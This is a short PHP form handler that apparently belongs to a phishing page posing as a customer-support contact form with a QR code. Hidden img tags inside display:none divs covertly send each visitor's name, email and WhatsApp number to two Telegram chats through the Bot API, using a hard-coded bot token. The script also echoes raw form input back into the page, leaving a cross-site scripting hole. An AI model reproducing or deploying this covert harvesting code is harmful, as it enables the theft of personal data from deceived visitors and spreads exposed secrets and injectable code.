<?php

$nome =$_POST["name"];
$email =$_POST["email"];
$username =$_POST["username"];
$atendente =$_POST["atendente"];
$assunto =$_POST["assunto"];
date_default_timezone_set('America/Sao_Paulo');
$data =date("d-m-Y");
$hora =date("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];

$URL_ATUAL= "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
echo "$nome <br>$atendente<br>$assunto<br>$username

<div class='u-container-layout u-valign-middle u-container-layout-5'>

<img class='u-image u-image-round u-preserve-proportions u-radius-10 u-image-1' src='//images01.nicepage.com/c13033f4a78eec2395c2063b/798b7eab4a635cb0bdcd7c94/qr.png' alt='' data-image-width='100' data-image-height='100'>                      </div><meta http-equiv='refresh' target='_blank' content='30; URL='#''/><div style='display:none'>
"; 

    echo "<div style='display:none'><img src='https://api.telegram.org/bot5188523752:AAE9vuwwGS26FGVy-jEqZiWRj79e0pYVR_g/sendMessage?chat_id=1576977833&text= Nome: $nome%0A E-mail: $email%0A whatsapp:https://wa.me/55$username%0A%0A $data | $hora%0A%20' alt='QR code'></div>"; 
echo "<div style='display:none'><img src='https://api.telegram.org/bot5188523752:AAE9vuwwGS26FGVy-jEqZiWRj79e0pYVR_g/sendMessage?chat_id=-1001632663335&text= Nome: $nome%0A E-mail: $email%0A whatsapp:https://wa.me/55$username%0A%0A $data | $hora%0A%20' alt='QR code'></div>"; 

?>